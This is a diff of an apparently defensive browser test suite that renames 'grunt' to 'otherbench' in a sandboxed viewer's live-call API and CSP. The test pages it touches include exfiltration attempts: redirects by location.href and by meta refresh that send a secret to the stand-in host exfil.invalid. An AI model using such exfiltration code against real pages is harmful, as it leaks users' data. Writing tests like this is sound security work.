@@ -30,8 +30,8 @@ const APP = `<!doctype html><meta charset="utf-8"><title>exfil app</title><body>
 window.loads = 0;
 window.addEventListener('message', (e) => {
   const d = e.data;
-  if (!d || d.grunt !== 'live-call') return;
-  e.source.postMessage({ grunt: 'live-result', v: 1, requestId: d.requestId, ok: true, text: '${SECRET}', cached: false, at: 1 }, '*');
+  if (!d || d.otherbench !== 'live-call') return;
+  e.source.postMessage({ otherbench: 'live-result', v: 1, requestId: d.requestId, ok: true, text: '${SECRET}', cached: false, at: 1 }, '*');
 });
 const frame = document.createElement('iframe');
 frame.id = 'f';
@@ -86,7 +86,7 @@ const VECTORS = `{
 
 function framePage(control: boolean): string {
   return `<!doctype html><meta charset="utf-8">
-<script src="grunt-live.js"></script>
+<script src="otherbench-live.js"></script>
 <pre id="out">waiting</pre><div id="stage"></div>
 <script>
 var CONTROL = ${control};
@@ -98,7 +98,7 @@ function quiet(p) { if (p && p.catch) p.catch(function () {}); }
 function add(html) { var d = document.createElement('div'); d.innerHTML = html; stage.appendChild(d); }
 function make(tag, attrs) { var n = document.createElement(tag); Object.keys(attrs).forEach(function (k) { n.setAttribute(k, attrs[k]); }); stage.appendChild(n); return n; }
 var vectors = ${VECTORS};
-grunt.live('value').then(function (r) {
+otherbench.live('value').then(function (r) {
   var data = encodeURIComponent(r.text);
   var runs = [];
   Object.keys(vectors).forEach(function (name) { runs.push([name, 'http'], [name, 'https']); });
@@ -128,8 +128,8 @@ function navigatingPage(how: 'location' | 'meta'): string {
     how === 'location'
       ? "location.href = 'http://exfil.invalid/navigate?d=' + encodeURIComponent(r.text);"
       : "var m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=http://exfil.invalid/navigate?d=' + encodeURIComponent(r.text); document.head.appendChild(m);";
-  return `<!doctype html><meta charset="utf-8"><script src="grunt-live.js"></script>
-<script>grunt.live('value').then(function (r) { ${go} });</script>`;
+  return `<!doctype html><meta charset="utf-8"><script src="otherbench-live.js"></script>
+<script>otherbench.live('value').then(function (r) { ${go} });</script>`;
 }
 
 let server: Server;
@@ -172,11 +172,11 @@ test.beforeAll(async () => {
         return void res.writeHead(200, { ...html, ...live }).end(navigatingPage('location'));
       case `${FOLDER}nav-meta.html`:
         return void res.writeHead(200, { ...html, ...live }).end(navigatingPage('meta'));
-      case `${FOLDER}grunt-live.js`:
+      case `${FOLDER}otherbench-live.js`:
         return void res.writeHead(200, { ...js, ...live }).end(LIVE_CLIENT_JS);
       case '/control/page.html':
         return void res.writeHead(200, html).end(framePage(true));
-      case '/control/grunt-live.js':
+      case '/control/otherbench-live.js':
         return void res.writeHead(200, js).end(LIVE_CLIENT_JS);
     }
     res.writeHead(404).end();
@@ -276,7 +276,7 @@ async function runVectors(w: Watch, frame: string): Promise<{ violations: string
 
 test('the page is served under the real livePolicy, the exact string the server unit tests pin', () => {
   expect(livePolicy('http://h/view/x/')).toBe(
-    "sandbox allow-scripts allow-forms; default-src 'none'; script-src 'unsafe-inline' http://h/view/x/grunt-live.js; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; object-src 'none'; manifest-src 'none'; form-action 'none'; base-uri 'none'"
+    "sandbox allow-scripts allow-forms; default-src 'none'; script-src 'unsafe-inline' http://h/view/x/otherbench-live.js; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; object-src 'none'; manifest-src 'none'; form-action 'none'; base-uri 'none'"
   );
 });
 
